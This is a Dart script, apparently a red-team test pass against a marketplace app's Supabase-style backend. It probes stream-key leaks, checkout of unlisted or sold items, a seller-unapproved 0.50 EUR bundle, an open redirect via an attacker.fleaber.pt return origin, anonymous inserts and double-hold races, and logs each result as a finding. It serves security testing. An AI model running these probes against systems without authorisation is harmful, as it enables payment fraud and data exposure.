/// Pass 2 — E6 mortos, E4 checkout bundle, E1 lives*, E8 hub reserve, E10 sessão.
import 'dart:convert';
import 'dart:io';
import '_rte.dart';

void main() async {
  final env = loadEnv();
  final c = Rte.fromEnv(env);
  await c.loginActors(env);
  await c.ensureBuyer2();

  final findings = <Map<String, dynamic>>[];
  final log = <String, dynamic>{};
  var n = 20;
  String nid(String s) => 'E1930-${s.toUpperCase()}-${++n}';
  void add(Map<String, dynamic> f) => findings.add(f);

  // ---- E1 lives * (stream keys) ----
  final livesStar = await c.rest(
    'GET',
    'lives?select=id,status,mux_stream_key,stream_key,mux_live_id,livekit_room_name,seller_id&limit=3',
  );
  log['lives_star'] = {'http': livesStar.status, 'snip': livesStar.snippet};
  final leakKey = livesStar.ok &&
      livesStar.json is List &&
      (livesStar.json as List).isNotEmpty &&
      livesStar.body.contains('mux_stream_key') &&
      !RegExp(r'"mux_stream_key"\s*:\s*null').hasMatch(livesStar.body);
  add(finding(
    id: nid('e1-lives-keys'),
    lens: 'E1',
    severity: leakKey ? 'P1' : 'P3',
    title: leakKey
        ? 'Anon lê mux_stream_key / stream keys em lives'
        : (livesStar.ok
            ? 'Anon SELECT lives (ids/status); keys nulas ou omitidas neste sample'
            : 'Anon blocked lives *'),
    pre: 'RLS lives anon',
    repro: 'GET lives?select=id,mux_stream_key,stream_key as anon',
    proven: livesStar.ok,
    evidence: {'http': livesStar.status, 'snip': livesStar.snippet},
  ));

  // ---- seller live (ended) for stamp ----
  final liveRow = await c.rest(
    'GET',
    'lives?seller_id=eq.${c.sellerId}&select=id,status,is_active&limit=5',
    service: true,
  );
  String? liveId;
  if (liveRow.ok && liveRow.json is List && (liveRow.json as List).isNotEmpty) {
    liveId = ((liveRow.json as List).first as Map)['id']?.toString();
  }
  log['seller_live'] = {'id': liveId, 'snip': liveRow.snippet};

  Future<String?> createProduct({
    required bool listed,
    required bool sold,
    required String title,
    double price = 8.5,
    int qty = 1,
  }) async {
    final h = await c.rest('POST', 'products', jwt: c.sellerJwt, prefer: 'return=representation', body: {
      'seller_id': c.sellerId,
      'title': title,
      'price': price,
      'quantity': qty,
      'list_on_marketplace': listed,
      'is_sold': sold,
      'description': prefix,
    });
    log['create_${title.hashCode}'] = {'http': h.status, 'snip': h.snippet};
    if (h.ok && h.json is List && (h.json as List).isNotEmpty) {
      return ((h.json as List).first as Map)['id']?.toString();
    }
    if (h.ok && h.json is Map) {
      return (h.json as Map)['id']?.toString();
    }
    return null;
  }

  Future<HttpHit> insertOrder({
    required String pid,
    String? lid,
    String status = 'aguarda_pagamento',
    String? jwt,
    String? buyer,
    String? bundleId,
  }) {
    return c.rest('POST', 'orders', jwt: jwt ?? c.buyerJwt, prefer: 'return=representation', body: {
      'buyer_id': buyer ?? c.buyerId,
      'seller_id': c.sellerId,
      'product_id': pid,
      'quantity': 1,
      'status': status,
      'payment_method': 'stripe',
      if (lid != null) 'live_id': lid,
      if (bundleId != null) 'bundle_id': bundleId,
      'price_total': 8.5,
    });
  }

  Future<HttpHit> checkout(String orderId, {String? jwt, String? origin}) {
    return c.edge('create-payment-intent', {
      'order_id': orderId,
      if (origin != null) 'web_return_origin': origin,
    }, jwt: jwt ?? c.buyerJwt);
  }

  // E6a: unlist + no live → hold/checkout should fail
  final pidUnlist = await createProduct(
    listed: false,
    sold: false,
    title: '$prefix unlist-dead',
  );
  HttpHit? holdUnlist;
  if (pidUnlist != null) {
    holdUnlist = await insertOrder(pid: pidUnlist);
    log['hold_unlist'] = {'http': holdUnlist.status, 'snip': holdUnlist.snippet};
  }

  // E6b: unlist + live_id stamp (ended live of same seller)
  HttpHit? holdStamp;
  String? stampOrderId;
  if (pidUnlist != null && liveId != null) {
    holdStamp = await insertOrder(pid: pidUnlist, lid: liveId);
    log['hold_unlist_live_stamp'] = {'http': holdStamp.status, 'snip': holdStamp.snippet};
    if (holdStamp.ok) {
      final body = holdStamp.json;
      if (body is List && body.isNotEmpty) {
        stampOrderId = (body.first as Map)['id']?.toString();
      } else if (body is Map) {
        stampOrderId = body['id']?.toString();
      }
    }
  }

  HttpHit? ckStamp;
  if (stampOrderId != null) {
    ckStamp = await checkout(stampOrderId);
    log['checkout_unlist_stamp'] = {'http': ckStamp.status, 'snip': ckStamp.snippet};
  }

  final stampSession = ckStamp != null &&
      ckStamp.ok &&
      (ckStamp.body.contains('cs_test_') || ckStamp.body.contains('checkout.stripe.com'));
  add(finding(
    id: nid('e6-unlist-live-stamp'),
    lens: 'E6',
    severity: stampSession ? 'P1' : 'INFO',
    title: stampSession
        ? 'Produto unlisted + live_id de directo antigo → Checkout Session TEST'
        : 'Unlist+live_id NÃO abriu Session (hold=${holdStamp?.status} ck=${ckStamp?.status})',
    pre: 'product list_on_marketplace=false is_sold=false; live ended same seller',
    repro: 'INSERT orders live_id=<ended> product unlisted; POST create-payment-intent',
    proven: stampSession,
    evidence: {
      'pid': pidUnlist,
      'live_id': liveId,
      'hold_no_live': holdUnlist?.snippet,
      'hold_stamp': holdStamp?.snippet,
      'checkout': ckStamp?.snippet,
    },
  ));

  // E6c: is_sold=true still listed on hub? create sold + try checkout
  final pidSold = await createProduct(
    listed: true,
    sold: true,
    title: '$prefix sold-dead',
  );
  HttpHit? holdSold;
  String? soldOid;
  if (pidSold != null) {
    holdSold = await insertOrder(pid: pidSold);
    log['hold_sold'] = {'http': holdSold.status, 'snip': holdSold.snippet};
    if (holdSold.ok) {
      final body = holdSold.json;
      if (body is List && body.isNotEmpty) soldOid = (body.first as Map)['id']?.toString();
    }
  }
  HttpHit? ckSold;
  if (soldOid != null) ckSold = await checkout(soldOid);
  log['checkout_sold'] = {'http': ckSold?.status, 'snip': ckSold?.snippet};
  final soldHub = pidSold == null
      ? null
      : await c.rest('GET', 'hub_products_public?id=eq.$pidSold&select=id,title,is_sold');
  log['hub_own_sold'] = {'http': soldHub?.status, 'snip': soldHub?.snippet};
  add(finding(
    id: nid('e6-sold-checkout'),
    lens: 'E6',
    severity: (ckSold != null && ckSold.ok && ckSold.body.contains('cs_test_')) ? 'P1' : 'INFO',
    title: (ckSold != null && ckSold.ok && ckSold.body.contains('cs_test_'))
        ? 'is_sold=true ainda gera Checkout Session'
        : 'is_sold bloqueia hold/checkout (hold=${holdSold?.status})',
    pre: 'product is_sold=true list_on_marketplace=true qty=1',
    repro: 'INSERT order + create-payment-intent',
    proven: ckSold != null && ckSold.ok && ckSold.body.contains('cs_test_'),
    evidence: {
      'pid': pidSold,
      'hold': holdSold?.snippet,
      'ck': ckSold?.snippet,
      'hub': soldHub?.snippet,
    },
  ));

  // E6d: listed, hold, then unlist, then pay
  final pidThenUnlist = await createProduct(
    listed: true,
    sold: false,
    title: '$prefix then-unlist',
  );
  String? thenOid;
  if (pidThenUnlist != null) {
    final h = await insertOrder(pid: pidThenUnlist);
    log['hold_then_unlist'] = {'http': h.status, 'snip': h.snippet};
    if (h.ok && h.json is List && (h.json as List).isNotEmpty) {
      thenOid = ((h.json as List).first as Map)['id']?.toString();
    }
    await c.rest('PATCH', 'products?id=eq.$pidThenUnlist', jwt: c.sellerJwt, body: {
      'list_on_marketplace': false,
    }, prefer: 'return=minimal');
  }
  HttpHit? ckThen;
  if (thenOid != null) ckThen = await checkout(thenOid);
  log['checkout_after_unlist'] = {'http': ckThen?.status, 'snip': ckThen?.snippet};
  add(finding(
    id: nid('e6-hold-then-unlist'),
    lens: 'E6',
    severity: (ckThen != null && ckThen.ok && ckThen.body.contains('cs_test_')) ? 'P1' : 'INFO',
    title: (ckThen != null && ckThen.ok && ckThen.body.contains('cs_test_'))
        ? 'Hold criado listed → unlist → Session ainda abre'
        : 'Unlist após hold bloqueia checkout',
    pre: 'hold aguarda_pagamento then PATCH list_on_marketplace=false',
    repro: 'create-payment-intent after unlist',
    proven: ckThen != null && ckThen.ok && ckThen.body.contains('cs_test_'),
    evidence: {'pid': pidThenUnlist, 'oid': thenOid, 'ck': ckThen?.snippet},
  ));

  // E4: pending hostile bundle → order + checkout
  final pidBag = await createProduct(
    listed: true,
    sold: false,
    title: '$prefix bag-item',
    price: 20,
  );
  String? bunId;
  if (pidBag != null) {
    final bun = await c.rest('POST', 'product_bundles', jwt: c.buyerJwt, prefer: 'return=representation', body: {
      'seller_id': c.sellerId,
      'buyer_id': c.buyerId,
      'product_ids': [pidBag],
      'subtotal_eur': 20,
      'discount_pct': 50,
      'discount_eur': 10,
      'total_eur': 0.50,
      'status': 'pending',
    });
    log['bundle2'] = {'http': bun.status, 'snip': bun.snippet};
    if (bun.ok && bun.json is List && (bun.json as List).isNotEmpty) {
      bunId = ((bun.json as List).first as Map)['id']?.toString();
    }
  }
  String? bunOid;
  if (pidBag != null && bunId != null) {
    final ho = await insertOrder(pid: pidBag, bundleId: bunId);
    log['bundle_order'] = {'http': ho.status, 'snip': ho.snippet};
    if (ho.ok && ho.json is List && (ho.json as List).isNotEmpty) {
      bunOid = ((ho.json as List).first as Map)['id']?.toString();
    }
  }
  HttpHit? ckBun;
  if (bunOid != null) ckBun = await checkout(bunOid);
  log['checkout_bundle_pending'] = {'http': ckBun?.status, 'snip': ckBun?.snippet};
  add(finding(
    id: nid('e4-bundle-pending-pay'),
    lens: 'E4',
    severity: (ckBun != null && ckBun.ok && ckBun.body.contains('cs_test_')) ? 'P1' : 'INFO',
    title: (ckBun != null && ckBun.ok && ckBun.body.contains('cs_test_'))
        ? 'Bundle pending total 0.50 gera Session (sem seller accept)'
        : 'Checkout recusa bundle pending hostil',
    pre: 'product_bundles status=pending total_eur=0.50',
    repro: 'order.bundle_id + create-payment-intent',
    proven: ckBun != null && ckBun.ok && ckBun.body.contains('cs_test_'),
    evidence: {'bundle': bunId, 'order': bunOid, 'ck': ckBun?.snippet},
  ));

  // E7: checkout with attacker.fleaber.pt origin on a listed product
  final pidOk = await createProduct(listed: true, sold: false, title: '$prefix listed-ok', price: 7);
  String? okOid;
  if (pidOk != null) {
    final h = await insertOrder(pid: pidOk);
    if (h.ok && h.json is List && (h.json as List).isNotEmpty) {
      okOid = ((h.json as List).first as Map)['id']?.toString();
    }
  }
  HttpHit? ckRedir;
  if (okOid != null) {
    ckRedir = await checkout(okOid, origin: 'https://attacker.fleaber.pt');
    log['checkout_redir'] = {'http': ckRedir.status, 'snip': ckRedir.snippet};
  }
  add(finding(
    id: nid('e7-pay-subdomain'),
    lens: 'E7',
    severity: (ckRedir != null && ckRedir.ok && ckRedir.body.contains('cs_test_')) ? 'P2' : 'INFO',
    title: 'create-payment-intent aceita web_return_origin attacker.fleaber.pt',
    pre: 'sanitizeWebReturnOrigin endsWith .fleaber.pt',
    repro: 'POST create-payment-intent web_return_origin=https://attacker.fleaber.pt',
    proven: ckRedir != null && ckRedir.ok && ckRedir.body.contains('cs_test_'),
    evidence: {'ck': ckRedir?.snippet, 'oid': okOid},
    note: 'Session≠capture. Impacto = open redirect pós-settle se subdomain takeover.',
  ));

  // E8: anon follow / reserve
  final folAnon = await c.rest('POST', 'follows', prefer: 'return=representation', body: {
    'follower_id': c.buyerId,
    'following_id': c.sellerId,
  });
  log['follow_anon'] = {'http': folAnon.status, 'snip': folAnon.snippet};
  add(finding(
    id: nid('e8-follow-anon'),
    lens: 'E8',
    severity: folAnon.ok ? 'P2' : 'INFO',
    title: folAnon.ok ? 'Anon INSERT follows' : 'Anon não segue sem auth',
    pre: 'RLS follows',
    repro: 'POST follows as anon',
    proven: folAnon.ok,
    evidence: {'http': folAnon.status, 'snip': folAnon.snippet},
  ));

  final resAnon = await c.rest('POST', 'live_reservation_requests', prefer: 'return=representation', body: {
    'buyer_id': c.buyerId,
    'live_id': liveId,
    'requested_qty': 1,
    'status': 'pending',
  });
  log['reserve_anon'] = {'http': resAnon.status, 'snip': resAnon.snippet};
  add(finding(
    id: nid('e8-reserve-anon'),
    lens: 'E8',
    severity: resAnon.ok ? 'P1' : 'INFO',
    title: resAnon.ok ? 'Anon cria live_reservation_requests' : 'Anon não reserva',
    pre: 'RLS reservations',
    repro: 'POST live_reservation_requests as anon',
    proven: resAnon.ok,
    evidence: {'http': resAnon.status, 'snip': resAnon.snippet},
  ));

  // E10 race: two buyers hold qty=1 listed
  final pidRace = await createProduct(listed: true, sold: false, title: '$prefix race-1', qty: 1);
  HttpHit? r1;
  HttpHit? r2;
  if (pidRace != null) {
    r1 = await insertOrder(pid: pidRace, jwt: c.buyerJwt, buyer: c.buyerId);
    r2 = await insertOrder(pid: pidRace, jwt: c.buyer2Jwt, buyer: c.buyer2Id);
    log['race'] = {'b1': r1.snippet, 'b2': r2.snippet, 's1': r1.status, 's2': r2.status};
  }
  final both = (r1?.ok == true) && (r2?.ok == true);
  add(finding(
    id: nid('e10-dual-hold'),
    lens: 'E10',
    severity: both ? 'P1' : 'INFO',
    title: both
        ? 'Dois buyers hold permanente qty=1 (órbita→stock)'
        : 'Segundo hold recusado (s1=${r1?.status} s2=${r2?.status})',
    pre: 'product qty=1 listed',
    repro: 'parallel INSERT orders aguarda_pagamento buyer1 ∥ buyer2',
    proven: both,
    evidence: {'r1': r1?.snippet, 'r2': r2?.snippet},
    note: 'dois holds ≠ dois pagos; Session ainda não captura.',
  ));

  // POST connect with attacker origin (onboarding URL)
  final conn = await c.edge('create-connect-account', {
    'web_return_origin': 'https://attacker.fleaber.pt',
  }, jwt: c.sellerJwt);
  log['connect_post_origin'] = {'http': conn.status, 'snip': conn.snippet};

  final outPath = Directory.current.path.endsWith('20260830T1930')
      ? 'out/pass2.json'
      : 'tool/redteam_blind_e_orbita_$stamp/out/pass2.json';
  await dumpJson(outPath, {
    'stamp': stamp,
    'project': projectMust,
    'log': log,
    'findings': findings,
  });
  stdout.writeln('pass2 proven=${findings.where((f) => f['proven'] == true).length}/${findings.length}');
  stdout.writeln(outPath);
}
